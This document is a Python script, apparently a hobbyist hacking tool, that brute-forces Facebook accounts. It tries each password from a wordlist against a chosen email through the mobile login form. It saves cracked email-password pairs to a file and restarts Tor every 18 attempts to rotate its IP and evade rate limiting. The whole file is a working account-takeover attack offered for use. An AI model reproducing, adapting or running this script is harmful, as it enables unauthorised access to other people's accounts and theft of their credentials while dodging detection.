#coding: utf-8
import os.path
import requests,json,re
import sys,os,time
logo=""" \033[1;92m_____              _                 _
|  ___|_ _  ___ ___| |__   ___   ___ | | __
| |_ / _` |/ __/ _ \ '_ \ / _ \ / _ \| |/ /
|  _| (_| | (_|  __/ |_) | (_) | (_) |   <
|_|  \__,_|\___\___|_.__/ \___/ \___/|_|\_\
BruteForce by Darius:"""
if sys.version_info[0] != 3:
  os.system('clear')
  print(logo)
  print(65 * '\033[1;92m=')
  print('''\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3 fb.py\n''')
  print(65 * '\033[1;92m=')
  sys.exit()
len_pass=0
MIN_PASSWORD_LENGTH = 6
POST_URL = 'https://www.facebook.com/login.php'
HEADERS = {'User-Agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'}
BODY = {}
COOKIES = {}
## ang pag gaya sa code na ito ay hindi magiging dahilan para tawaging kang coder bigyan moko ng credit sa pag gaya mo at matutuwa pako
## copying this code will not be a reason to call you a coder give me credit for copying and I'll be happy
def create_form():
    form = dict()
    cookies = {'fr': '0IMUuWXccH2pkzP45.AWUFdV5Dgg4VhLNhaLFw5FPobiA.Bid6Iv.mO.AAA.0.0.BigPLT.AWWg4f-WBVM','dpr': '3','locale': 'tl_PH','m_pixel_ratio': '3'}
    try:
      data = requests.get(POST_URL, headers=HEADERS)
    except:
      create_form()
    try:
      for cookie in data.cookies:
        cookies[cookie.name]=cookie.value
      action_url= re.findall(r'method="post" action="(.*?)"',data.text).pop(0)
      value=re.findall(r'value="(.*?)"',data.text)
      form['lsd']=value[0]
      form['jazoest']=value[1]
      form['m_ts']=value[2]
      form['li']=value[3]
      form['try_number']=value[4]
      form['unrecognized_tries']=value[5]
      form['login']=value[6]
      form['bi_xrwh']=value[10]
      return form, cookies, action_url
    except:
      create_form()


def na_hack_naba(email, index, password):
    global BODY, COOKIES
    BODY, COOKIES, URL = create_form()
    BODY['email'] = email
    BODY['pass'] = password
    try:
      r = requests.post('https://m.facebook.com{}'.format(str(URL)), data=BODY, cookies=COOKIES, headers=HEADERS)
    except:
      na_hack_naba(email, index, password)
    try:
      if "c_user" in r.cookies:
        open('hacked.txt', 'a').write(str(email+' | '+password))
        print(65 * '\033[1;92m=')
        print('\n\033[1;93mPassword found Sir: \033[1;92m'+password+'\n')
        print(65 * '\033[1;92m=')
        return True
      elif len(r.cookies) == 0:
        open('hacked.txt', 'a').write(str(email+' | '+password))
        print(65 * '\033[1;92m=')
        print('\n\033[1;93mPassword found Sir: \033[1;92m'+password+'\n')
        print(65 * '\033[1;92m=')
        return True
      elif "checkpoint" in r.cookies or "checkpoint_title" in r.text:
        open('hack_but_checkpoint.txt', 'a').write(str(email+' | '+password))
        print(65 * '\033[1;92m=')
        print('\n\033[1;93mPassword found but checkpoint: \033[1;92m'+password+'\n')
        print(65 * '\033[1;92m=')
        return True
    except:
      na_hack_naba(emai, index, password)
    return False

def change_ip():
  try:
    old=requests.get('http://checkip.amazonaws.com/')
  except:
    pass
  while True:
    try:
      x=os.system('killall -HUP tor')
      time.sleep(3)
      ip=requests.get('http://checkip.amazonaws.com/')
    except:
      pass
    try:
      if old.text==ip.text:
        pass
      else:
        return ip.text
    except:
      pass
  
if __name__ == "__main__":
  os.system('reset')
  os.system('clear')
  print(logo)
  print(65 * '\033[1;92m=')
  print('\033[1;92mEmail/Username/Id/etc:')
  email = input('\033[1;94m==\033[1;92m>>> \033[1;91m').strip()
  print('\033[1;92m[+] Password File:')
  PASSWORD_FILE = input('\033[1;94m==\033[1;92m>>> \033[1;91m')
  if not os.path.isfile(PASSWORD_FILE):
    print("Password file not exist: ")
    sys.exit(0)
  else:
    try:
      password_data = open(PASSWORD_FILE, 'r').read().split("\n")
    except:
      print('\033[1;91m[!] Error reading file')
      sys.exit(1)
    print('\033[1;92m[+] Passwords Number {}'.format(str(len(password_data))))
    print('\033[1;92m[+] \033[1;91mPlease use Tor')
    print(65 * '\033[1;92m=')
    for index, password in zip(range(password_data.__len__()), password_data):
        password = password.strip()
        if len(password) < MIN_PASSWORD_LENGTH:
            continue
        elif int(len_pass)==18:
          print(65 * '\033[1;92m=')
          ip=change_ip()
          try:
            print('\033[1;92m[+] New phone: \033[;97m{}'.format(str(ip)))
          except:
            pass
          len_pass=0
        len_pass+=1
        print("\033[1;92mTrying password [ "+str(index)+" ]: \033[1;97m"+str(password))
        if na_hack_naba(email, index, password):
            break